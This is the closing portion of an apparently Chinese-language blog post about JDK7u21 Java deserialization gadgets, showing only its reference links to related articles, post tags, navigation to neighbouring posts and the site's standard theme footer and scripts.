+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223001156031.png" alt="image-20200223001156031"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6884#toc-7">JDK反序列化Gadgets 7u21</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175754.html">JDK7u21反序列化漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ShuSheng0007/article/details/81269295">秒懂Java动态编程（Javassist研究）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6e962d1e7ddd">Java动态代理-实战</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag"># Java反序列化漏洞</a>
+              <a href="/tags/JDK7u21/" rel="tag"># JDK7u21</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/02/18/Hello-World/" rel="prev" title="Hello World">
+                  <i class="fa fa-angle-left"></i> Hello World
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/02/25/FastJson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="FastJson 1.2.24 反序列化">
+                  FastJson 1.2.24 反序列化 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
